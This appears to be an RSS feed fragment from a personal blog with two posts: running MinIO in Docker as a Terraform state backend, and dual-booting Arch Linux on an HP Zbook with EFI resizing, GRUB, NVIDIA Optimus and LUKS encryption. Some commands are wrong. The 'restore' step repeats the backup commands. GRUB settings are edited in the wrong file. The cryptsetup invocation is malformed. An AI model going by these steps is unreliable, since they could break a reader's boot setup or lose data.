I already knew that there were different implementations of the AWS S3 object storage system, Cepth and MinIO, so I decided to test MinIO.&lt;/p&gt;</description><content type="html"><![CDATA[<h2 id="context">Context</h2>
<p>In one of my homelab servers I make a heavy use of Docker containers (yes, plain Docker) to provide different tools and applications.
At this time, I was looking for a way of moving Terraform state files from the cloud to my home controlled infrastructure to reduce costs.
I already knew that there were different implementations of the AWS S3 object storage system, Cepth and MinIO, so I decided to test MinIO.</p>
<h2 id="minio-deployment">MinIO Deployment</h2>
<p>As usual, I put the MinIO deployment into a <code>docker-compose.yaml</code> like the one below which makes MinIO available considering:</p>
<ul>
<li>It&rsquo;s behind Traefik proxy.</li>
<li><code>proxy</code> network is Traefik network.</li>
<li>I pass <code>MINIO_BROWSER_REDIRECT_URL</code> so that when reaching <code>s3.domain.local</code> with a browser it redirects to the MinIO management console.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">minio</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">minio/minio:&lt;tag&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">server</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">/data</span>
</span></span><span style="display:flex;"><span>      - --<span style="color:#ae81ff">console-address</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;:9001&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">MINIO_BROWSER_REDIRECT_URL=http://s3-console.domain.local</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">proxy</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">&lt;/host/path&gt;:/data</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.routers.minio.entrypoints=http&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.routers.minio.service=minio&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.routers.minio.rule=Host(`s3.domain.local`)&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.services.minio.loadbalancer.server.port=9000&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.routers.minio-console.service=minio-console&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.routers.minio-console.rule=Host(`s3-console.domain.local`)&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;traefik.http.services.minio-console.loadbalancer.server.port=9001&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">proxy</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>Once the Docker resources are created (container running), you can access the Management console (<code>s3.domain.local</code> or <code>s3-console.domain.local</code>) with the default admin credentials <code>minioadmin:minioadmin</code> or use the <a href="https://docs.min.io/docs/minio-client-complete-guide.html">MinIO CLI</a></p>
<h2 id="s3-bucket-creation">S3 Bucket Creation</h2>
<p>Once logged into the MinIO management console, I performed the following actions:</p>
<ul>
<li>From the Buckets section, I created a bucket named <code>tfstate</code>.</li>
<li>From the Identity section, I created a Service Accounts, noting down the access and secret keys.</li>
</ul>
<h2 id="terraform-backend-configuration">Terraform Backend configuration</h2>
<p>Finally, to make use of the S3 bucket as backend for a terraform project, you configure Terraform like the following example (recently updated for Terraform 1.6.6):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">terraform {</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">backend &#34;s3&#34; {</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">bucket = &#34;tfstate&#34;                 </span> <span style="color:#75715e"># Name of the S3 bucket</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">endpoints = {</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">s3 = &#34;http://s3.domain.local&#34;  </span> <span style="color:#75715e"># Minio endpoint</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">key = &#34;project-name.tfstate&#34;       </span> <span style="color:#75715e"># Name of the tfstate file</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">access_key=&#34;xxxxxxxxxxxx&#34;          </span> <span style="color:#75715e"># Access and secret keys</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">secret_key=&#34;xxxxxxxxxxxxxxxxxxxxxx&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">region = &#34;main&#34;                    </span> <span style="color:#75715e"># Region validation will be skipped</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">skip_credentials_validation = true </span> <span style="color:#75715e"># Skip AWS related checks and validations</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">skip_requesting_account_id = true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">skip_metadata_api_check = true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">skip_region_validation = true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">use_path_style = true            </span> <span style="color:#75715e"># Enable path-style S3 URLs (https://&lt;HOST&gt;/&lt;BUCKET&gt; https://developer.hashicorp.com/terraform/language/settings/backends/s3#use_path_style</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>More details can be found in the official <a href="https://www.terraform.io/language/settings/backends/s3">Terraform S3 Backend documentation</a>.</p>
]]></content></item><item><title>Arch Linux on... HP Zbook</title><link>https://ruben-rodriguez.github.io/posts/archlinux-zbook-installation-notes/</link><pubDate>Mon, 25 Jul 2022 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/archlinux-zbook-installation-notes/</guid><description>&lt;h2 id="context"&gt;Context&lt;/h2&gt;
&lt;p&gt;HP Zbook workstations are one of my favorites battle ready laptops out there (besides Dell XPS developer edition). I&amp;rsquo;m yet to put my hands on a future ready ultrabook like the &lt;a href="https://slimbook.es/"&gt;SLIMBOOKs&lt;/a&gt;. Now, if I want to tackle some serious business with this beast (like ricing i3, edit YAML files or develop some funny golang pointless app) I will need to install my favorite OS of all time!&lt;/p&gt;
&lt;p&gt;The situation at hand is:&lt;/p&gt;</description><content type="html"><![CDATA[<h2 id="context">Context</h2>
<p>HP Zbook workstations are one of my favorites battle ready laptops out there (besides Dell XPS developer edition). I&rsquo;m yet to put my hands on a future ready ultrabook like the <a href="https://slimbook.es/">SLIMBOOKs</a>. Now, if I want to tackle some serious business with this beast (like ricing i3, edit YAML files or develop some funny golang pointless app) I will need to install my favorite OS of all time!</p>
<p>The situation at hand is:</p>
<ul>
<li>I just got an HP Zbook Power G8 workstation laptop.</li>
<li>It has Windows 10 preinstalled.</li>
<li>I want to keep the Windows installation, meaning, I need a dualboot setup.</li>
</ul>
<p>The main issue of having Windows 10 preinstalled in the machine is that, by default, Windows installer creates an absurdly small EFI partition of 100MB. This partition holds the different OS bootloaders while booting in UEFI mode. Of course, you can try, but most probably you will fail while setting up a dualboot when executing the <code>mkinitcpio</code> script used to create the initial ramdisk to the EFI (/boot) partition because it has not enough space left to store the files.</p>
<h2 id="extend-efi-partition">Extend EFI partition</h2>
<p>In my case, I had no other choice than extending the EFI partition. And, yet another issue we find in our way! GParted (which uses libparted) is <a href="https://bugzilla.gnome.org/show_bug.cgi?id=649324#c4">not able</a> to resize FAT32 (format of EFI) partitions that are less than 256MB in size. As suggested in the bug comments, I followed these steps:</p>
<ol>
<li>Backup the data in the FAT16/FAT32 partition; you can use a USB stick and a live Arch ISO, and execute, for example:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ mount /dev/sdx1 /mnt <span style="color:#75715e"># Mount your EFI partition, replace sdx1 with ESP/EFI partition</span>
</span></span><span style="display:flex;"><span>λ mkdir usb
</span></span><span style="display:flex;"><span>λ mount /dev/sdx1 usb  <span style="color:#75715e"># Mount your USB stick (you might need flags like -t exfat for mounting)</span>
</span></span><span style="display:flex;"><span>λ rsync -av /mnt/ usb/ <span style="color:#75715e"># Copy EFI partition files to the USB</span>
</span></span><span style="display:flex;"><span>λ ls usb/              <span style="color:#75715e"># Check USB contents</span>
</span></span><span style="display:flex;"><span>λ umount /mnt          <span style="color:#75715e"># Umount the EFI partition</span>
</span></span></code></pre></div><ol start="2">
<li>Reformat the partition to EXT4; for this, you can use GParted live or <code>gdisk</code> commands.</li>
<li>Resize EXT4 partition to desired partition size; again, you can use GParted for this.</li>
<li>Reformat the partition back to FAT16/FAT32; important bit here is to set the partition type (flags) accordingly (boot and esp)</li>
<li>Restore the FAT16/FAT32 files from backup:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ mount /dev/sdx1 /mnt <span style="color:#75715e"># Mount your EFI partition, replace sdx1 with ESP/EFI partition</span>
</span></span><span style="display:flex;"><span>λ mkdir usb
</span></span><span style="display:flex;"><span>λ mount /dev/sdx1 usb  <span style="color:#75715e"># Mount your USB stick (you might need flags like -t exfat for mounting)</span>
</span></span><span style="display:flex;"><span>λ rsync -av /mnt/ usb/ <span style="color:#75715e"># Copy EFI partition files to the USB</span>
</span></span><span style="display:flex;"><span>λ ls usb/              <span style="color:#75715e"># Check USB contents</span>
</span></span><span style="display:flex;"><span>λ umount /mnt          <span style="color:#75715e"># Umount the EFI partition</span>
</span></span></code></pre></div><p>In my case, after doing a backup of the EFI partition files with Arch Linux Live installation media to a USB, I booted into GParted live and performed the following actions (using the GUI):</p>
<ol>
<li>Resized Windows main partition (half disk)</li>
<li>Moved Windows main partition to the right by 2GB (this takes about 10 minutes to complete)</li>
<li>Formatted EFI partition to ext4</li>
<li>Extended EFI partition 2GB to the right (the free space made available by moving Windows main partition to the right)</li>
<li>Formatted EFI partition back to FAT32 and set <code>boot</code> and <code>esp</code> flags to the partition.</li>
</ol>
<p>Finally, I booted Arch Linux live installation media and restored EFI/ESP backup files to the new resized EFI partition. Afterwards, I proceeded to install Arch Linux.</p>
<h2 id="arch-linux-installation">Arch Linux Installation</h2>
<p>Basically I followed the <a href="https://wiki.archlinux.org/title/installation_guide">Arch Linux installation guide</a>.</p>
<h3 id="boot-loader">Boot Loader</h3>
<p>In terms of boot manager, I chose GRUB (the one I&rsquo;m most familiar with) and followed these steps to also detect the Windows installation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ pacman -S grub efibootmgr os-prober
</span></span><span style="display:flex;"><span>λ grub-install --target<span style="color:#f92672">=</span>x86_64-efi --efi-directory<span style="color:#f92672">=</span>/boot --bootloader-id<span style="color:#f92672">=</span>GRUB
</span></span><span style="display:flex;"><span>λ os-prober <span style="color:#75715e"># To check that Windows was in fact detected</span>
</span></span><span style="display:flex;"><span>λ vim /boot/grub/grub.cfg <span style="color:#75715e"># Edit GRUB config </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Uncomment GRUB_DISABLE_OS_PROBER=false so grub adds an entry for Windows installation</span>
</span></span><span style="display:flex;"><span>λ grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></div><p>At this point, I was able to boot into the new Archlinux installation and perform post-installation activities.</p>
<h3 id="enabling-aur">Enabling AUR</h3>
<p>This is a standard step I always run to be able to access the AUR (Arch User Repository)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo git clone https://aur.archlinux.org/yay.git
</span></span><span style="display:flex;"><span>λ cd yay/
</span></span><span style="display:flex;"><span>λ sudo makepkg -si
</span></span><span style="display:flex;"><span>λ yay -Syu
</span></span></code></pre></div><h3 id="graphics-driver">Graphics Driver</h3>
<p>This topic is also somehow special for this machine. The specifications for HP Zbook Power G8 shows that it has two GPUs, Intel graphics (integrated) and NVIDIA GPU (dedicated). <a href="https://wiki.archlinux.org/title/NVIDIA_Optimus">NVIDIA Optimus</a> allows these beast laptops that have dedicated GPUs to access both graphic cards depending on the task being run. Unfortunately, there is no support for this technology in Linux out of the box, and there are different options available (can be checked in the Arch Linux <a href="https://wiki.archlinux.org/title/NVIDIA_Optimus#Available_methods">wiki</a>). I chose to have access to both integrated &amp; dedicated graphics and I installed <a href="https://github.com/Askannz/optimus-manager">Optimus Manager</a> (available in the AUR) which is a program aimed to provide an easy way to switch GPU modes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo pacman -S nvidia
</span></span><span style="display:flex;"><span>λ sudo pacman -S xorg xorg-apps
</span></span><span style="display:flex;"><span>λ yay -S optimus-manager optimus-manager-qt
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reboot</span>
</span></span><span style="display:flex;"><span>λ optimus-manager --switch nvidia 
</span></span><span style="display:flex;"><span>λ  optimus-manager --status
</span></span><span style="display:flex;"><span>Optimus Manager <span style="color:#f92672">(</span>Client<span style="color:#f92672">)</span> version 1.4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Current GPU mode : nvidia
</span></span><span style="display:flex;"><span>GPU mode requested <span style="color:#66d9ef">for</span> next login : no change
</span></span><span style="display:flex;"><span>GPU at startup : auto
</span></span><span style="display:flex;"><span>Temporary config path: no
</span></span></code></pre></div><p>I configured optimus (with the help of <code>optimus-manager-qt</code>) so when the laptop is started with battery it will use integrated graphis and the other way arround:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  cat /etc/optimus-manager/optimus-manager.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>amd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>DRI<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>driver<span style="color:#f92672">=</span>modesetting
</span></span><span style="display:flex;"><span>tearfree<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>intel<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>DRI<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>accel<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>driver<span style="color:#f92672">=</span>modesetting
</span></span><span style="display:flex;"><span>modeset<span style="color:#f92672">=</span>yes
</span></span><span style="display:flex;"><span>tearfree<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>nvidia<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>DPI<span style="color:#f92672">=</span><span style="color:#ae81ff">96</span>
</span></span><span style="display:flex;"><span>PAT<span style="color:#f92672">=</span>yes
</span></span><span style="display:flex;"><span>allow_external_gpus<span style="color:#f92672">=</span>no
</span></span><span style="display:flex;"><span>dynamic_power_management<span style="color:#f92672">=</span>no
</span></span><span style="display:flex;"><span>ignore_abi<span style="color:#f92672">=</span>no
</span></span><span style="display:flex;"><span>modeset<span style="color:#f92672">=</span>yes
</span></span><span style="display:flex;"><span>options<span style="color:#f92672">=</span>overclocking
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>optimus<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>auto_logout<span style="color:#f92672">=</span>yes
</span></span><span style="display:flex;"><span>pci_power_control<span style="color:#f92672">=</span>yes
</span></span><span style="display:flex;"><span>pci_remove<span style="color:#f92672">=</span>no
</span></span><span style="display:flex;"><span>pci_reset<span style="color:#f92672">=</span>hot_reset
</span></span><span style="display:flex;"><span>startup_auto_battery_mode<span style="color:#f92672">=</span>integrated
</span></span><span style="display:flex;"><span>startup_auto_extpower_mode<span style="color:#f92672">=</span>nvidia
</span></span><span style="display:flex;"><span>startup_mode<span style="color:#f92672">=</span>auto
</span></span><span style="display:flex;"><span>switching<span style="color:#f92672">=</span>none
</span></span></code></pre></div><blockquote>
<p>At the time of this installation, <a href="https://bugs.archlinux.org/task/74886">nvidia may not boot</a> on Linux 5.18 (or later) on systems with Intel CPUs. When changing to hybrid or nvidia graphics mode with <code>envycontrol</code> you may find a blank screen. To solve it, you can boot a live CD installation and chroot into it to execute <code>envycontrol</code> and change back to the integrated graphics mode.</p>
</blockquote>
<p>Checking the logs from previous boot you will find something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  journalctl -b-3
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>traps: Missing ENDBR: _nv011889rm+0x0/0x10 <span style="color:#f92672">[</span>nvidia<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>kernel: ------------<span style="color:#f92672">[</span> cut here <span style="color:#f92672">]</span>------------
</span></span><span style="display:flex;"><span>kernel: kernel BUG at arch/x86/kernel/traps.c:253!
</span></span><span style="display:flex;"><span>systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Failed to start Load Kernel Modules.
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Until this is fixed, a workaround is disabling the Indirect Branch Tracking CPU security feature by setting the <code>ibt=off</code> kernel parameter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  vim /etc/default/grub
</span></span><span style="display:flex;"><span>GRUB_CMDLINE_LINUX_DEFAULT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loglevel=3 quiet ibt=off&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>λ  grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></div><blockquote>
<p>An issue I faced during a system package upgrade is that I stumbled on a black screen and I were only able to login to a tty. This was caused by an upgrade to <code>optimus-manager</code> package that broke it (I checked by running <code>optimus-manager --status</code> on the tty session after login). The solution was as easy as reinstalling <code>optimus-manager</code> with clean build options through <code>yay</code>.</p>
</blockquote>
<h2 id="customizations--tweaks">Customizations &amp; Tweaks</h2>
<p>This is more of a personal taste and involves my usual setup of basic tools (window manager, sound control, etc)</p>
<h3 id="window-manager-vs-desktop-environment">Window Manager vs. Desktop Environment</h3>
<p>Ever since I tried a Window Manager (i3), I have not been able to go back to a proper DE (I&rsquo;ve used GNOME, Cinammon and, lately, KDE Plasma). Whenever I try a DE, I feel really slow using the machine. For that reason, I find myself really comfortable using i3 WM and the usual tools that are installed with it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo pacman -S i3
</span></span></code></pre></div><h3 id="login">Login</h3>
<p>I also installed <a href="https://wiki.archlinux.org/title/LightDM#Installation">ligthdm</a> to perform the login (autologin)</p>
<pre tabindex="0"><code># /etc/lightdm/lightdm.conf
[Seat:*]
autologin-user=username
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ groupadd -r autologin
</span></span><span style="display:flex;"><span>λ gpasswd -a username autologin
</span></span></code></pre></div><h3 id="sound">Sound</h3>
<p>The only issue I found after completing the installation was that no sound card was detected by issuing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ cat /proc/asound/cards
</span></span></code></pre></div><p>Installing the <a href="https://www.sofproject.org/">Sound Open Firmware</a> solved the issue:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo pacman -S sof-firmware
</span></span><span style="display:flex;"><span>λ cat /proc/asound/cards
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>sofhdadsp<span style="color:#f92672">]</span>: sof-hda-dsp - sof-hda-dsp
</span></span><span style="display:flex;"><span>        HP-HPZBookPower15.6inchG8MobileWorkstationPC
</span></span></code></pre></div><p>I also installed <code>pulseadio</code> and <code>pa-applet</code> to be able to control the volume of the default device. Also, so that function keys work, <code>dunst</code>, a lightweight replacement for the notification-daemons provided by most desktop environments, is required:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo pacman -S pulseaudio dunst
</span></span><span style="display:flex;"><span>λ yay -S pa-applet-git
</span></span></code></pre></div><h3 id="brightness">Brightness</h3>
<p>For controlling the display brightness, I installed <code>brightnessctl</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo pacman -S brightnessctl
</span></span><span style="display:flex;"><span>λ brightnessctl set 50%
</span></span></code></pre></div><p>You can then add keybindings to your i3 config file:</p>
<pre tabindex="0"><code>bindsym XF86MonBrightnessDown exec &#34;brightnessctl set 10%-; notify-send &#39;brightness down&#39;&#34;
bindsym XF86MonBrightnessUp exec &#34;brightnessctl set +10%; notify-send &#39;brightness up&#39;&#34;
</code></pre><h3 id="bonus-root-partition-encryption">[BONUS] Root partition encryption</h3>
<p>This is something I always do on laptop installations that are subject to be stolen or lost in the wild.
I usually do it at installation time, though sometimes I forget and I&rsquo;m forced to do it afterwards using this <a href="https://wiki.archlinux.org/title/Dm-crypt/Device_encryption#Encrypt_an_existing_unencrypted_file_system">article</a> from our beloved Arch Wiki.
I followed these steps:</p>
<ol>
<li>Perform a backup using your favorite method, I used <a href="https://wiki.archlinux.org/title/Rsync#As_a_backup_utility"><code>rsync</code></a>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ rsync -aAXHv --exclude<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;/dev/*&#34;</span>,<span style="color:#e6db74">&#34;/proc/*&#34;</span>,<span style="color:#e6db74">&#34;/sys/*&#34;</span>,<span style="color:#e6db74">&#34;/tmp/*&#34;</span>,<span style="color:#e6db74">&#34;/run/*&#34;</span>,<span style="color:#e6db74">&#34;/mnt/*&#34;</span>,<span style="color:#e6db74">&#34;/media/*&#34;</span>,<span style="color:#e6db74">&#34;/lost+found&#34;</span><span style="color:#f92672">}</span> / /path/to/backup
</span></span></code></pre></div><ol start="2">
<li>Then, boot a live Arch iso and make room for the encryption (LUKS) headers; I resized the root filesystem by 1GB, more than enough (about 16Mb) required</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ resize2fs /dev/sdXY 399G <span style="color:#75715e">#(400 - 1)</span>
</span></span></code></pre></div><ol start="3">
<li>Encrypt the root partition:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ cryptsetup root --encrypt /dev/sdXY --reduce-device-size 16M
</span></span></code></pre></div><ol start="4">
<li>We open the just created encrypted volume:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ cryptsetup open /dev/sdXY root
</span></span></code></pre></div><ol start="5">
<li>Resize the filesystem again to expand to all the partition size:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ resize2fs /dev/mapper/root 
</span></span></code></pre></div><ol start="6">
<li>Then, without leaving the Archlinux live ISO, we mount the root partition unencrypted volume and the existing <code>/boot</code> partition:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ mount /dev/mapper/root /mnt
</span></span><span style="display:flex;"><span>λ mount /dev/sdaX /mnt/boot
</span></span></code></pre></div><ol start="7">
<li>Now, we <code>chroot</code> into the installation:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ arch-chroot /mnt
</span></span></code></pre></div><ol start="8">
<li>While <code>chrooted</code>, perform the following actions:</li>
</ol>
<ul>
<li>Check the root <code>PARTITION</code> UUID:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ blkid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> user:
</span></span><span style="display:flex;"><span>/dev/sda1: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this-is-the-UIID-to-keep&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;crypto_LUKS&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxxxxx&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda2: TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;BitLocker&#34;</span> PARTLABEL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Data partition&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxxxxxxx&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda3: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxx&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vfat&#34;</span> PARTLABEL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;EFI partition&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxx&#34;</span>
